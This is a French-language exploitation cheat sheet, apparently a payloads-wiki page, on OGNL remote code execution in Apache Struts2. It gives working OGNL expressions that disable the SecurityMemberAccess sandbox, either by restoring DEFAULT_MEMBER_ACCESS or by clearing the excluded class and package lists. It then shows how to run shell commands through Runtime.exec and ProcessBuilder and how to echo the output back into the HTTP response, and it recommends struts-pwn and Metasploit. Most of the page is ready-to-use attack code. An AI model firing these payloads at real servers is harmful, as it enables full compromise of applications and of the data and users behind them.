---
title: "Exécution de code à distance OGNL : nettoyer le sandbox d'accès aux membres de Struts2"
description: "Struts2 moderne met l'OGNL en sandbox avec SecurityMemberAccess, donc l'exécution de code à distance restaure d'abord l'accès aux membres via le contexte OGNL, puis atteint Runtime et ProcessBuilder."
keywords:
  - exécution de code à distance OGNL
  - RCE Struts2
  - DEFAULT_MEMBER_ACCESS
  - contournement SecurityMemberAccess
  - ProcessBuilder OGNL
---

# Exécution de code à distance

OGNL peut nommer `java.lang.Runtime` et appeler ses méthodes, donc sur un évaluateur non protégé une seule expression exécute une commande. Struts2 moderne ne le laisse pas sans protection : l'évaluation s'exécute sous un `SecurityMemberAccess` qui refuse l'accès aux classes et noms de package exclus, et les appels de méthode réflexifs sur `Runtime` ou `ProcessBuilder` échouent tant que cette restriction n'est pas levée. L'exécution de code à distance sur une pile actuelle est donc en deux temps : restaurer l'accès aux membres, puis appeler le runtime.

## Restaurer l'accès aux membres

Le contexte contient un objet `MemberAccess` dont les contrôles conditionnent chaque appel réflexif. Le remplacer par la valeur par défaut permissive réactive l'accès aux types exclus :

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}
```

Là où ce champ ne peut pas être affecté sur une version donnée, l'équivalent consiste à vider les listes de refus sur le `_memberAccess` existant de sorte que rien ne reste exclu :

```
%{#m=#_memberAccess,#m.excludedClasses.clear(),#m.excludedPackageNames.clear()}
```

L'une ou l'autre forme laisse le contexte capable de réfléchir dans `java.lang` pour l'appel qui suit. Ces formes dépendent de la version : le nom exact du champ et le fait que les collections soient mutables varient selon les versions de Struts2, donc la forme opérationnelle est celle qui correspond à l'évaluateur devant le puits.

## Atteindre le runtime

Une fois l'accès aux membres restauré, `@java.lang.Runtime@getRuntime().exec(...)` exécute une commande. `Runtime.exec(String)` découpe en tokens sur les espaces et n'utilise aucun shell, donc il convient à un unique programme avec des arguments simples :

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec("id")}
```

Comme il n'y a pas de shell, `$(...)`, les pipes, `;` et les redirections sont passés comme des tokens argv littéraux et ne chaînent pas les commandes. Pour les fonctionnalités de shell, construisez un tableau d'arguments explicite où le shell est le programme et la ligne de commande complète est un unique élément, et exécutez-le via `ProcessBuilder` :

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#cmd=new java.lang.String[]{"/bin/bash","-c","id; uname -a"},new java.lang.ProcessBuilder(#cmd).start()}
```

## Renvoyer la sortie

Pour lire le résultat dans la réponse plutôt que de tirer à l'aveugle, conservez le préambule de nettoyage du sandbox, redirigez l'erreur vers la sortie, et diffusez le processus dans un writer de réponse HTTP récupéré depuis le contexte :

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
#cmd=new java.lang.String[]{"/bin/bash","-c","id"},
#pb=new java.lang.ProcessBuilder(#cmd),
#pb.redirectErrorStream(true),
#proc=#pb.start(),
#out=new java.util.Scanner(#proc.getInputStream()).useDelimiter("\\A").next(),
#resp=@org.apache.struts2.ServletActionContext@getResponse(),
#resp.getWriter().println(#out),
#resp.getWriter().flush()}
```

`redirectErrorStream(true)` replie stderr dans le flux capturé de sorte que les commandes en échec renvoient quand même un diagnostic, et le `Scanner` avec le délimiteur `\A` lit toute la sortie en un seul token. Récupérer la réponse depuis `ServletActionContext` écrit le résultat directement au client même lorsque le résultat de la value stack est par ailleurs jeté.

## Outils

- **Burp Suite** : Repeater pour délivrer le préambule de nettoyage du sandbox et l'appel runtime.
- **struts-pwn** : outil de PoC exerçant les vecteurs d'exécution de code à distance OGNL de Struts2.
- **Metasploit Framework** : modules d'exploitation OGNL de Struts2.

## Références

- [Apache Commons OGNL Language Guide](https://commons.apache.org/dormant/commons-ognl/language-guide.html)
- [Apache Struts2 Security](https://struts.apache.org/security/)
- [PayloadsAllTheThings: Java OGNL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
